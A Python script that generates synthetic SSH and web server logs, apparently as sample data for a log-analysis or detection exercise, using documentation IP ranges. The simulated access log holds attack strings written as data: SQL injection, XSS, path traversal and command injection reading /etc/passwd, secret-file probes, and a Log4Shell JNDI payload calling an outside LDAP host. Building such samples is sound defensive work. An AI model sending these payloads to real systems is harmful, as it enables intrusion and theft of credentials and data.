"""Make the sample logs in samples/. All addresses are from the documentation ranges
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), so no real host appears in them."""
import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(7)
OUT = Path(__file__).resolve().parent.parent / "samples"
OUT.mkdir(exist_ok=True)
HOST = "web01"
BASE = datetime(2026, 11, 18, 8, 0, 0)


def syslog(ts):
    return f"{ts.strftime('%b')} {ts.day:2d} {ts.strftime('%H:%M:%S')}"


auth = []


def ssh(ts, msg):
    auth.append((ts, f"{syslog(ts)} {HOST} sshd[{random.randint(1000, 30000)}]: {msg}"))


# normal logins
for i in range(12):
    ts = BASE + timedelta(minutes=random.randint(0, 600))
    user, ip = random.choice([("alice", "198.51.100.7"), ("bob", "198.51.100.23"), ("deploy", "198.51.100.40")])
    ssh(ts, f"Accepted publickey for {user} from {ip} port {random.randint(30000, 60000)} ssh2: RSA SHA256:abc")
# a few honest typos
ts = BASE + timedelta(hours=3)
for i in range(2):
    ssh(ts + timedelta(seconds=i * 20), "Failed password for alice from 198.51.100.7 port 40112 ssh2")
ssh(ts + timedelta(seconds=70), "Accepted password for alice from 198.51.100.7 port 40118 ssh2")

# brute force on root and admin
ts = BASE + timedelta(hours=1, minutes=12)
for i in range(32):
    user = random.choice(["root", "admin", "test", "ubuntu", "oracle"])
    inv = "" if user == "root" else "invalid user "
    ssh(ts + timedelta(seconds=i * 5), f"Failed password for {inv}{user} from 203.0.113.50 port {random.randint(30000, 60000)} ssh2")

# user enumeration
ts = BASE + timedelta(hours=2, minutes=40)
for i, user in enumerate(["git", "postgres", "mysql", "ftp", "jenkins", "tomcat", "svn", "nagios", "zabbix"]):
    t = ts + timedelta(seconds=i * 12)
    ssh(t, f"Invalid user {user} from 203.0.113.77 port {random.randint(30000, 60000)}")
    ssh(t, f"Failed password for invalid user {user} from 203.0.113.77 port {random.randint(30000, 60000)} ssh2")

# brute force that ends in a successful login
ts = BASE + timedelta(hours=4, minutes=5)
for i in range(9):
    ssh(ts + timedelta(seconds=i * 8), f"Failed password for deploy from 192.0.2.99 port {random.randint(30000, 60000)} ssh2")
ssh(ts + timedelta(seconds=90), "Accepted password for deploy from 192.0.2.99 port 51234 ssh2")

auth.sort(key=lambda x: x[0])
(OUT / "auth.log").write_text("\n".join(line for _, line in auth) + "\n")

web = []


def hit(ts, ip, method, path, status, agent, size=None, ref="-"):
    size = size if size is not None else random.randint(200, 9000)
    web.append((ts, f'{ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S")} +0000] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{agent}"'))


BROWSER = "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
# normal visitors
pages = ["/", "/about", "/blog", "/blog/post-1", "/contact", "/static/app.css", "/static/app.js", "/favicon.ico"]
for i in range(220):
    ts = BASE + timedelta(seconds=random.randint(0, 36000))
    ip = random.choice(["198.51.100.7", "198.51.100.23", "198.51.100.40", "198.51.100.61", "198.51.100.88"])
    status = 200 if random.random() > 0.04 else 404
    hit(ts, ip, "GET", random.choice(pages), status, BROWSER)

# directory and secret scanner with a known tool agent
ts = BASE + timedelta(hours=1, minutes=30)
paths = ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin", "/backup.zip", "/config.php", "/server-status",
         "/.aws/credentials", "/xmlrpc.php", "/adminer", "/actuator/health"]
for i, p in enumerate(paths * 2):
    hit(ts + timedelta(seconds=i * 2), "203.0.113.9", "GET", p, 404, "Mozilla/5.0 (compatible; Nmap Scripting Engine)", 162)

# sql injection attempts
ts = BASE + timedelta(hours=2, minutes=10)
for i, q in enumerate(["/blog?id=1%27%20OR%20%271%27=%271", "/blog?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
                       "/search?q=1;%20DROP%20TABLE%20users", "/blog?id=1%20AND%20SLEEP(5)"]):
    hit(ts + timedelta(seconds=i * 7), "203.0.113.15", "GET", q, 500 if i % 2 else 200, "sqlmap/1.7.2#stable (https://sqlmap.org)")

# xss, traversal, command injection, log4shell
ts = BASE + timedelta(hours=3, minutes=20)
hit(ts, "203.0.113.31", "GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, BROWSER)
hit(ts + timedelta(seconds=30), "203.0.113.31", "GET", "/download?file=../../../../etc/passwd", 400, BROWSER)
hit(ts + timedelta(seconds=60), "203.0.113.31", "GET", "/ping?host=127.0.0.1;cat%20/etc/passwd", 200, BROWSER)
hit(ts + timedelta(minutes=5), "203.0.113.120", "GET", "/", 200, "${jndi:ldap://198.51.100.200:1389/a}")
hit(ts + timedelta(minutes=5), "203.0.113.120", "GET", "/?x=${jndi:ldap://198.51.100.200:1389/a}", 200, BROWSER)

# password guessing on the login page
ts = BASE + timedelta(hours=5, minutes=2)
for i in range(40):
    hit(ts + timedelta(seconds=i * 6), "192.0.2.44", "POST", "/wp-login.php", 200 if i % 9 else 302, BROWSER, 4300)

web.sort(key=lambda x: x[0])
(OUT / "access.log").write_text("\n".join(line for _, line in web) + "\n")
print(f"{len(auth)} auth lines, {len(web)} access lines")
